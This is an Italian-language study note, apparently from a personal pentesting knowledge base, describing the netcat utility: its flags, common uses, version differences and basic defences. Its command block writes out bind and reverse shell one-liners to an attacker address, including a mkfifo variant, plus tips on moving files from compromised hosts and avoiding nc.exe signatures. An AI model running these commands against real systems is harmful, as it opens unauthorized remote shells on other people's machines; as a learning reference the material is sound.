---
tipo: entita
tag: [tool]
fase: 2
fonti: 3
aggiornato: 2026-06-20
stato: maturo
aliases: ["netcat"]

---

# netcat

## Cos'è

**netcat** (abbreviato `nc`) è un'utility di rete definita il "coltellino svizzero del networking". Permette di aprire connessioni TCP/UDP, mettere porte in ascolto, trasferire file, fare banner grabbing e molto altro. È lo strumento base per ricevere [[Reverse Shell e Bind Shell]] durante un pentest. Disponibile su Linux, macOS e Windows, è spesso preinstallato sui sistemi target — il che lo rende utile anche in [[Post-Exploitation]].

> **Nota etica**: netcat è uno strumento legittimo usato da sysadmin e sicurezza. Il suo uso per stabilire shell non autorizzate su sistemi altrui è illegale.

## Uso tipico

```bash
# Ascolto su una porta (listener) — usato per ricevere reverse shell
nc -lvnp 4444

# Connessione a un host su una porta specifica
nc 192.168.1.10 80

# Banner grabbing — scoprire la versione di un servizio
echo "" | nc -w 1 192.168.1.10 22

# Trasferimento file (sul ricevente prima, poi sul mittente)
# Ricevente:
nc -lvnp 4444 > file_ricevuto.txt
# Mittente:
nc 192.168.1.10 4444 < file_da_inviare.txt

# Bind shell — il target mette una shell in ascolto (se supporta -e)
nc -lvnp 4444 -e /bin/bash

# Reverse shell dal target verso l'attaccante (se nc supporta -e)
nc 10.10.14.1 4444 -e /bin/bash

# Reverse shell con mkfifo (nc senza -e, versione sicura)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.1 4444 >/tmp/f

# Scansione porte semplice (senza nmap)
nc -zv 192.168.1.10 20-80

# Chat semplice tra due macchine
# Macchina A: nc -lvnp 1234
# Macchina B: nc IP_macchina_A 1234
```

**Flag chiave:**

| Flag | Significato |
|---|---|
| `-l` | Modalità ascolto (listen) |
| `-v` | Verbose (mostra connessioni) |
| `-n` | Non risolvere i nomi DNS (più veloce) |
| `-p` | Porta su cui ascoltare |
| `-e` | Esegue un programma quando si riceve una connessione (non tutte le versioni) |
| `-w` | Timeout in secondi |
| `-z` | Zero-I/O mode: solo scan, non invia dati |
| `-u` | Usa UDP invece di TCP |

## Quando si usa

- Ricevere **reverse shell** durante [[Exploitation]]: `nc -lvnp 4444`.
- Fare **banner grabbing** manuale di servizi per identificare versioni.
- **Trasferire file** da/verso un sistema compromesso in [[Post-Exploitation]] (alternativa a scp quando le credenziali non sono disponibili).
- Test di connettività tra macchine in laboratorio.
- Creare server TCP improvvisati per debugging.

## Note e trucchi

- **Versioni diverse di nc**: la versione OpenBSD (la più comune su Kali/Debian) NON supporta `-e`. La versione tradizionale (netcat-traditional) sì. Verificare con `nc --version` o `nc -h`. Per reverse shell senza `-e` usare il trick **mkfifo**.
- **ncat** (parte del pacchetto Nmap) è una versione moderna di nc con supporto SSL, IPv6 e `-e` su tutte le piattaforme: `ncat -lvnp 4444`.
- Su Windows, netcat non è preinstallato ma si può caricare `nc.exe` (versione Windows) o usare PowerShell per connessioni simili.
- **Quando `nc` non c'è ma Python sì**: si ricostruisce un netcat (listener + command shell + upload) in puro Python — vedi [[Tool di Rete in Python]]. Niente binario da caricare, nessuna firma di `nc.exe`.
- Per stabilizzare una shell grezza ricevuta con nc: vedi [[Reverse Shell e Bind Shell]] per il trucco `python3 pty`.

## Mitigazione e difesa

- Rimuovere netcat dai sistemi di produzione se non necessario.
- Monitorare i processi che aprono porte di ascolto insolite.
- Usare IDS/IPS per rilevare traffico anomalo su porte non standard.

## Collegamenti

- [[Reverse Shell e Bind Shell]]
- [[Exploitation]]
- [[Post-Exploitation]]
- [[Nmap]]
- [[Enumerazione]]
- [[Kali Linux]]

## Fonti

- netcat man page (OpenBSD): <https://man.openbsd.org/nc.1>
- HackTricks — netcat: <https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/nc-mkfifo>
- PayloadsAllTheThings — Reverse Shell: <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md>
